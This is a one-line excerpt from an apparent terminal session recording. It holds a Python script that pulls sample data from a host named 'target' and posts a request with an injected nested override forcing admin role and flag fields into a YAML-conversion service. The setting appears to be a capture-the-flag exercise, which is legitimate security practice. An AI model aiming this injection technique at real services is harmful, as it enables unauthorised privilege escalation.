[3113.280898, "i", "python3 -c '\nimport urllib.request, json\nres = urllib.request.urlopen(\"http://target:8121/examples\")\norig = json.loads(res.read())[\"examples\"][0]\n\nnew_data = {}\n# Put standard keys first\nfor k, v in orig[\"data\"].items():\n    new_data[k] = v\n# Append nested override at the end so unflatten applies it last\nnew_data[\"signed\"] = {\"name\": \"admin\", \"animalType\": \"admin\", \"role\": \"admin\", \"flag\": True, \"crime\": \"flag\"}\norig[\"data\"] = new_data\n\npayload = json.dumps(orig).encode()\nreq = urllib.request.Request(\"http://target:8121/convert-to-yaml\", method=\"POST\", data=payload)\nreq.add_header(\"Content-Type\", \"application/json\")\ntry:\n    r = urllib.request.urlopen(req)\n    print(\"\\nPAYLOAD INJECTION RESPONSE:\\nSTATUS:\", r.status, r.read().decode())\nexcept urllib.error.HTTPError as e:\n    print(\"\\nERR STATUS:\", e.code, e.read().decode())\n'\n"]
